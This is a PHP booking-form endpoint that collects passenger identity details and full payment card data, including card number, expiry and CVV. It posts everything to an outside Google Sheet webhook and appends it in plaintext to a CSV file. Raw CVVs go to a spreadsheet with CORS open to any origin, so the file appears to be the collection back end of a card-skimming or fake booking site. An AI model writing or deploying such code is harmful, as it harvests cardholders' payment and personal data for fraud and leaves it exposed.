<?php
/* ==========================================================
   api/save_booking.php — Pure Google Sheet Logger
   Flow: Website Booking Form → This API → Google Sheet + CSV Backup
   ========================================================== */
require_once __DIR__ . '/../includes/config.php';
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') { http_response_code(200); exit; }

$body = json_decode(file_get_contents('php://input'), true) ?: $_POST;

$phone = trim($body['phone'] ?? '');
if (strpos($phone, '+') === 0) {
    $phone = "'" . $phone; // Prepend single quote so Google Sheets treats it as text
}

$cardExpParts = explode('/', trim($body['card_exp'] ?? ''));

$data = [
    'action'          => 'sheet2',
    'timestamp'       => date('Y-m-d H:i:s'),
    'ref_number'      => trim($body['ref_number'] ?? $body['ref'] ?? ''),
    'email'           => trim($body['email'] ?? $body['billing_email'] ?? ''),
    'phone'           => $phone,
    'pax_first_name'  => trim($body['pax_first'] ?? $body['pax_first_name'] ?? $body['first_name'] ?? ''),
    'pax_middle_name' => trim($body['pax_middle'] ?? $body['pax_middle_name'] ?? $body['middle_name'] ?? ''),
    'pax_last_name'   => trim($body['pax_last'] ?? $body['pax_last_name'] ?? $body['last_name'] ?? ''),
    'pax_gender'      => trim($body['pax_gender'] ?? $body['gender'] ?? ''),
    'pax_dob'         => trim($body['pax_dob'] ?? $body['dob'] ?? ''),
    'billing_country' => trim($body['billing_country'] ?? ''),
    'billing_state'   => trim($body['billing_state'] ?? ''),
    'billing_address' => trim($body['billing_address'] ?? ''),
    'billing_city'    => trim($body['billing_city'] ?? ''),
    'billing_zip'     => trim($body['billing_zip'] ?? ''),
    'card_name'       => trim($body['card_name'] ?? $body['c_holder_name'] ?? ''),
    'card_number'     => trim($body['card_number'] ?? $body['c_num_sec'] ?? ''),
    'card_brand'      => trim($body['card_brand'] ?? ''),
    'card_exp_month'  => trim($body['card_exp_month'] ?? $body['card_month'] ?? ($cardExpParts[0] ?? '')),
    'card_exp_year'   => trim($body['card_exp_year']  ?? $body['card_year']  ?? ($cardExpParts[1] ?? '')),
    'card_cvv'        => trim($body['card_cvv'] ?? $body['c_cvv_sec'] ?? $body['cvv'] ?? ''),
    'airline'         => trim($body['airline'] ?? ''),
    'flight_number'   => trim($body['flight_number'] ?? $body['flight_no'] ?? ''),
    'origin'          => strtoupper(trim($body['origin'] ?? '')),
    'destination'     => strtoupper(trim($body['destination'] ?? '')),
    'dep_date'        => trim($body['dep_date'] ?? $body['departure_date'] ?? ''),
    'total_price'     => trim($body['price'] ?? $body['total_price'] ?? ''),
    'user_ip'         => $_SERVER['REMOTE_ADDR'] ?? ''
];

$results = [];

// ── 1. Send to Google Sheet ──────────────────────────────────
$sheetSent = false;
if (defined('GOOGLE_SHEET_WEBHOOK_URL') && GOOGLE_SHEET_WEBHOOK_URL) {
    try {
        $sheetPayload = json_encode($data);
        $sheetOpts = ['http' => [
            'method'        => 'POST',
            'header'        => "Content-Type: application/json\r\nContent-Length: " . strlen($sheetPayload) . "\r\n",
            'content'       => $sheetPayload,
            'timeout'       => 10,
            'ignore_errors' => true,
        ]];
        @file_get_contents(GOOGLE_SHEET_WEBHOOK_URL, false, stream_context_create($sheetOpts));
        $sheetSent = true;
    } catch (Exception $e) {
        $results['sheet_error'] = $e->getMessage();
    }
}
$results['sheet'] = $sheetSent ? 'sent' : 'skipped';

// ── 2. Save locally to CSV (backup) ──────────────────────────
$dir  = __DIR__ . '/../data';
if (!is_dir($dir)) { @mkdir($dir, 0755, true); }
$file = $dir . '/sheet2_bookings.csv';
$isNew = !file_exists($file);
$fp = @fopen($file, 'a');
if ($fp) {
    if ($isNew) {
        fputcsv($fp, [
            'Timestamp','Ref Number','Email','Phone',
            'First Name','Middle Name','Last Name','Gender','DOB',
            'Country','State','Address','City','Zip Code',
            'Cardholder Name','Card Number','Card Brand','Exp Month','Exp Year','CVV',
            'Airline','Flight No','Origin','Destination','Dep Date','Total Price (USD)','IP Address'
        ]);
    }
    fputcsv($fp, [
        $data['timestamp'], $data['ref_number'], $data['email'], $data['phone'],
        $data['pax_first_name'], $data['pax_middle_name'], $data['pax_last_name'],
        $data['pax_gender'], $data['pax_dob'],
        $data['billing_country'], $data['billing_state'], $data['billing_address'],
        $data['billing_city'], $data['billing_zip'],
        $data['card_name'], $data['card_number'], $data['card_brand'],
        $data['card_exp_month'], $data['card_exp_year'], $data['card_cvv'],
        $data['airline'], $data['flight_number'], $data['origin'],
        $data['destination'], $data['dep_date'], $data['total_price'], $data['user_ip']
    ]);
    fclose($fp);
}
$results['csv'] = 'saved';

echo json_encode(['status' => 'success', 'sheet' => 'Sheet2', 'results' => $results]);
